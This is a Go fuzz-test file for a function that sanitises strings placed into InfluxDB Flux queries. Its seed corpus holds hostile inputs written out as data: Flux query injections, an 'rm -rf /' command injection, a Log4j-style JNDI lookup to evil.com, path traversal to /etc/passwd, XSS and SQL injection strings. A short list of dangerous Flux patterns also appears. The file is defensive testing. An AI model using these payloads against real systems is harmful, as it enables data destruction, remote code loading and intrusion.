// Copyright (c) 2025 Darren Soothill
// Licensed under the MIT License

package storage

import (
	"strings"
	"testing"
)

// FuzzSanitizeFluxString tests Flux query sanitization with random inputs
// This is critical for security to prevent Flux injection attacks
func FuzzSanitizeFluxString(f *testing.F) {
	// Seed corpus with known attack patterns and edge cases
	f.Add("simple-device-123")                                // Normal input
	f.Add("")                                                 // Empty string
	f.Add("device\"with\"quotes")                             // Quotes
	f.Add("device\\with\\backslashes")                        // Backslashes
	f.Add("\") |> drop() //")                                 // Flux injection attempt
	f.Add("device\nwith\nnewlines")                           // Newlines
	f.Add("device\rwith\rcarriage\rreturns")                  // Carriage returns
	f.Add("device\x00with\x00nulls")                          // Null bytes
	f.Add("\"\\\n\r\x00")                                     // All special chars
	f.Add(") |> drop() |> from(bucket: \"malicious")          // Drop table injection
	f.Add("\"; import \"os\"; os.system(\"rm -rf /\"); //")   // System command injection
	f.Add("' OR '1'='1")                                      // SQL-style injection
	f.Add("${jndi:ldap://evil.com/a}")                        // Log4j-style injection
	f.Add("../../../etc/passwd")                              // Path traversal
	f.Add("<script>alert('xss')</script>")                    // XSS attempt
	f.Add("SELECT * FROM users")                              // SQL injection
	f.Add("|> yield()")                                       // Flux pipe
	f.Add("from(bucket: \"other\")")                          // Bucket switching
	f.Add(strings.Repeat("A", 2000))                          // Very long string
	f.Add(strings.Repeat("\"", 100))                          // Many quotes
	f.Add(strings.Repeat("\\", 100))                          // Many backslashes
	f.Add(strings.Repeat("\n", 100))                          // Many newlines
	f.Add("device\u0000unicode\u0001control\u001fchars")      // Unicode control chars
	f.Add("device\t\v\f")                                     // Other whitespace chars
	f.Add("🔥💀👾")                                             // Emoji
	f.Add("日本語デバイス")                                        // Japanese
	f.Add("设备测试")                                            // Chinese
	f.Add("Устройство")                                       // Russian

	f.Fuzz(func(t *testing.T, input string) {
		// Call should never panic
		result := sanitizeFluxString(input)

		// Result should never be longer than 1000 characters (plus escaping overhead)
		// Each char could be escaped to 2 chars max, so 2000 is absolute max
		if len(result) > 2000 {
			t.Errorf("sanitizeFluxString() result too long: %d characters (input: %d)", len(result), len(input))
		}

		// Critical security checks: dangerous characters must be escaped or removed
		// These checks ensure injection attacks are prevented

		// Check 1: Unescaped quotes (") should not exist
		// (escaped quotes are \", which is OK)
		if strings.Contains(result, `"`) && !strings.Contains(result, `\"`) {
			// This is only a problem if there's a quote that's not escaped
			// Count unescaped quotes
			unescapedQuotes := 0
			for i := 0; i < len(result); i++ {
				if result[i] == '"' {
					// Check if it's escaped (preceded by \)
					if i == 0 || result[i-1] != '\\' {
						unescapedQuotes++
					}
				}
			}
			if unescapedQuotes > 0 {
				t.Errorf("sanitizeFluxString() contains unescaped quotes: %q (input: %q)", result, input)
			}
		}

		// Check 2: Null bytes should be removed
		if strings.Contains(result, "\x00") {
			t.Errorf("sanitizeFluxString() contains null bytes: %q (input: %q)", result, input)
		}

		// Check 3: Newlines should be escaped
		if strings.Contains(result, "\n") && !strings.Contains(result, "\\n") {
			// Check if any newlines are unescaped
			for i := 0; i < len(result); i++ {
				if result[i] == '\n' {
					// Check if it's escaped (preceded by \)
					if i == 0 || result[i-1] != '\\' {
						t.Errorf("sanitizeFluxString() contains unescaped newline at position %d: %q (input: %q)", i, result, input)
						break
					}
				}
			}
		}

		// Check 4: Carriage returns should be escaped
		if strings.Contains(result, "\r") && !strings.Contains(result, "\\r") {
			// Check if any CRs are unescaped
			for i := 0; i < len(result); i++ {
				if result[i] == '\r' {
					// Check if it's escaped (preceded by \)
					if i == 0 || result[i-1] != '\\' {
						t.Errorf("sanitizeFluxString() contains unescaped carriage return at position %d: %q (input: %q)", i, result, input)
						break
					}
				}
			}
		}

		// Check 5: Result should not contain common Flux injection patterns
		// These should be escaped and thus harmless
		dangerousPatterns := []string{
			"|> drop()",
			"|> delete()",
			"from(bucket:",
			"|> to(",
		}
		for _, pattern := range dangerousPatterns {
			if strings.Contains(result, pattern) {
				// This is actually OK if the pattern is in escaped form
				// But if it appears literally, it could be executed
				// We need to verify the characters are properly escaped
				t.Logf("Warning: result contains pattern %q: %q (input: %q)", pattern, result, input)
			}
		}

		// Property-based check: length should be reasonable
		// Original input could be up to 1000 chars
		// Each char could be escaped (doubled at most)
		// So result should be <= 2 * minInt(len(input), 1000)
		maxExpectedLen := 2 * minInt(len(input), 1000)
		if len(result) > maxExpectedLen {
			t.Errorf("sanitizeFluxString() result length %d exceeds expected max %d (input length: %d)", len(result), maxExpectedLen, len(input))
		}
	})
}

// FuzzSanitizeFluxString_InjectionPatterns focuses on injection attack patterns
func FuzzSanitizeFluxString_InjectionPatterns(f *testing.F) {
	// Seed with common injection prefixes/suffixes
	f.Add("\") |> ", "drop()", " //")
	f.Add("'; ", "import \"os\"; ", " //")
	f.Add("\\\"", " |> yield()", "")
	f.Add("", "from(bucket: \"", "\")")
	f.Add("\n", "|> ", "delete()")

	f.Fuzz(func(t *testing.T, prefix, middle, suffix string) {
		// Build an injection attempt
		input := prefix + middle + suffix

		// Sanitize
		result := sanitizeFluxString(input)

		// The injection should be neutralized (escaped)
		// We can't execute it, but we can check the escaping worked

		// Critical: no unescaped quotes that could break string context
		for i := 0; i < len(result); i++ {
			if result[i] == '"' {
				// Check if escaped
				if i == 0 || result[i-1] != '\\' {
					// Further check: is the backslash itself escaped?
					if i >= 2 && result[i-2] == '\\' && result[i-1] == '\\' {
						// This is \\" which is OK (escaped backslash followed by escaped quote)
						continue
					}
					t.Errorf("Found unescaped quote at position %d in result: %q (input: %q)", i, result, input)
					break
				}
			}
		}
	})
}

// FuzzSanitizeFluxString_LengthBoundary tests length boundary conditions
func FuzzSanitizeFluxString_LengthBoundary(f *testing.F) {
	// Test around the 1000 character limit
	f.Add(strings.Repeat("A", 999), "B")
	f.Add(strings.Repeat("A", 1000), "")
	f.Add(strings.Repeat("A", 1001), "")
	f.Add(strings.Repeat("\"", 500), "")
	f.Add(strings.Repeat("\\", 500), "")

	f.Fuzz(func(t *testing.T, base, extra string) {
		input := base + extra

		result := sanitizeFluxString(input)

		// Should never panic or return something too long
		if len(result) > 2000 {
			t.Errorf("Result too long: %d characters", len(result))
		}

		// Should be deterministic
		result2 := sanitizeFluxString(input)
		if result != result2 {
			t.Errorf("Non-deterministic results for input %q: %q vs %q", input, result, result2)
		}
	})
}

// minInt returns the minimum of two integers
func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
